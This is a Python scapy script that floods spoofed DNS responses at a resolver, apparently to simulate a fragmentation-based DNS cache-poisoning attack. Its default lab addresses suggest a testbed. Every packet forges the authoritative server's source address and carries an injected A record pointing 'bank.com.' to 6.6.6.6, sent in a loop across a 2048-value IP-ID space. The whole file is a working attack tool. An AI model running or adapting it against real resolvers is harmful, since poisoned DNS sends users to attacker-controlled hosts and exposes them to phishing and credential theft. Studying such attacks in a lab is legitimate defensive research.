import os
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.30.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.30.0.100")
RESOLVER_UPSTREAM_PORT = int(os.getenv("RESOLVER_UPSTREAM_PORT", "33333"))

IPID_SPACE = int(os.getenv("IPID_SPACE", "2048"))
ATTACK_RATE = float(os.getenv("ATTACK_RATE", "0.02"))
POISON_IP = os.getenv("POISON_IP", "6.6.6.6")
POISON_DOMAIN = os.getenv("POISON_DOMAIN", "bank.com.")
FRAG2_QNAME = os.getenv("FRAG2_QNAME", "_frag2.example.net.")
FRAGMETA_QNAME = os.getenv("FRAGMETA_QNAME", "_fragmeta.example.net.")


def build_packet(ipid: int):
    return (
        IP(src=AUTH_IP, dst=RESOLVER_IP)
        / UDP(sport=53, dport=RESOLVER_UPSTREAM_PORT)
        / DNS(
            id=ipid % 65535,
            qr=1,
            aa=1,
            rd=1,
            qd=DNSQR(qname=FRAG2_QNAME, qtype="TXT"),
            an=DNSRR(rrname=POISON_DOMAIN, type="A", ttl=300, rdata=POISON_IP),
            ar=DNSRR(
                rrname=FRAGMETA_QNAME,
                type="TXT",
                ttl=1,
                rdata=f"TYPE=FRAG2;IPID={ipid}",
            ),
            ancount=1,
            arcount=1,
        )
    )


def main():
    print(
        f"[*] Flooding forged frag2 packets: "
        f"IPID_SPACE={IPID_SPACE}, ATTACK_RATE={ATTACK_RATE}s"
    )
    packets = [build_packet(ipid) for ipid in range(IPID_SPACE)]

    while True:
        send(packets, verbose=0)
        time.sleep(ATTACK_RATE)


if __name__ == "__main__":
    main()
